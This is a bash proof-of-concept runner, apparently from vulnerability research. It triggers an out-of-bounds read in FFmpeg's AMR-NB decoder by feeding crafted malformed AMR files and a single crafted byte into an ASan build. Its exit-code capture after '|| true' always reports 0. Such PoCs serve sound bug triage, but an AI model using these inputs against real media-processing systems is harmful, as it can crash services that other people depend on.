#!/usr/bin/env bash
# PoC runner for VULN 001: AMR-NB Decoder buf[0] OOB Read Before Size Check
# libavcodec/libopencore-amr.c :: amr_nb_decode_frame(), line 118

POC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
FFMPEG="/data/ylwang/non-textfuzz/target/FFmpeg/build_test/ffmpeg"
PYTHON="python3"
ASAN_OPTS="detect_leaks=0:abort_on_error=0:print_stacktrace=1:halt_on_error=0"

echo "========================================================"
echo "VULN 001 – AMR-NB Decoder buf[0] OOB Read Before Size Check"
echo "========================================================"
echo "Date: $(date)"
echo "FFmpeg: ${FFMPEG}"
echo ""

if [ ! -x "${FFMPEG}" ]; then
    echo "[ERROR] ffmpeg binary not found: ${FFMPEG}"
    exit 1
fi

# Step 1: Generate malformed input files
echo "[*] Generating malformed AMR-NB input files..."
cd "${POC_DIR}"
"${PYTHON}" vuln_001_gen.py
echo ""

run_test() {
    local label="$1"
    local input="$2"
    local extra_args="$3"

    echo "------------------------------------------------------------"
    echo "[TEST] ${label}"
    echo "       File : ${input} ($(wc -c < "${input}" 2>/dev/null || echo '?') bytes)"

    if [ -n "${extra_args}" ]; then
        cmd_str="${FFMPEG} ${extra_args} -i ${input} -f null - -v warning"
    else
        cmd_str="${FFMPEG} -i ${input} -f null - -v warning"
    fi
    echo "       CMD  : ${cmd_str}"

    out=$(ASAN_OPTIONS="${ASAN_OPTS}" timeout 30 ${cmd_str} 2>&1) || true
    ec=$?
    echo "       EXIT : ${ec}"

    # Check for ASAN crash indicators
    if echo "${out}" | grep -qiE "AddressSanitizer|heap-buffer-overflow|heap-use-after-free|null.*dereference|SEGFAULT|shadow byte|READ of size|WRITE of size"; then
        echo "       *** ASAN / MEMORY ERROR DETECTED ***"
        echo "${out}"
    else
        echo "       Output (first 10 lines):"
        echo "${out}" | head -10
    fi
    echo ""
}

# Tests using crafted AMR files
run_test "FT=9 x500 (1-byte frames, passes size guard)"    "${POC_DIR}/vuln_001_input.amr"       ""
run_test "FT=0 truncated (mode only, no payload)"          "${POC_DIR}/vuln_001_input_trunc.amr"  ""
run_test "FT=15 x500 (1-byte frames)"                      "${POC_DIR}/vuln_001_input_ft15.amr"   ""
run_test "Mixed FT=9 x10 + FT=0 truncated"                 "${POC_DIR}/vuln_001_input_mixed.amr"  ""
run_test "Valid FT=0 x100 (correct 13-byte frames)"        "${POC_DIR}/vuln_001_input_valid_ft0.amr" ""
run_test "Mixed all FT types (FT=0,1,7,8,9,14,15)"        "${POC_DIR}/vuln_001_input_mixed_ft.amr" ""
run_test "Force -f amrnb on truncated FT=0"                "${POC_DIR}/vuln_001_input_trunc.amr"  "-f amrnb"
run_test "Force -f amrnb on FT=9 x500"                     "${POC_DIR}/vuln_001_input.amr"        "-f amrnb"
run_test "Magic header only (flush path)"                   "${POC_DIR}/vuln_001_input_empty.amr"  ""

# Test: pipe single FT=9 byte (minimal 1-byte frame via stdin)
echo "------------------------------------------------------------"
echo "[TEST] Pipe single FT=9 byte (0x4C) via stdin"
out2=$(printf '\x4C' | ASAN_OPTIONS="${ASAN_OPTS}" timeout 10 "${FFMPEG}" -f amrnb -i pipe:0 -f null - -v warning 2>&1) || true
ec2=$?
echo "       EXIT : ${ec2}"
if echo "${out2}" | grep -qiE "AddressSanitizer|heap-buffer|null.*dereference|shadow byte"; then
    echo "       *** ASAN / MEMORY ERROR DETECTED ***"
    echo "${out2}"
else
    echo "       Output (first 5 lines):"
    echo "${out2}" | head -5
fi
echo ""

echo "========================================================"
echo "All tests complete."
echo "========================================================"
